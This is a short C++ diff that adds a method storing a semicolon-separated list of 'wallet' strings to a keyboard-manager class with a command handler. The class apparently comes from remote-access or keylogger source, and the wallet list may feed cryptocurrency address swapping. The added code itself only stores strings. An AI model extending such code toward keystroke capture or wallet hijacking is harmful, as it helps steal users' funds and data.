@@ -80,6 +80,13 @@ void CKeyboardManager1::Notify()
     WaitForDialogOpen();
 }
 
+void CKeyboardManager1::UpdateWallet(const std::string& wallet)
+{
+    m_mu.Lock();
+    m_Wallet = StringToVector(wallet, ';', MAX_WALLET_NUM);
+    m_mu.Unlock();
+}
+
 void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, ULONG nSize)
 {
     if (lpBuffer[0] == COMMAND_NEXT)
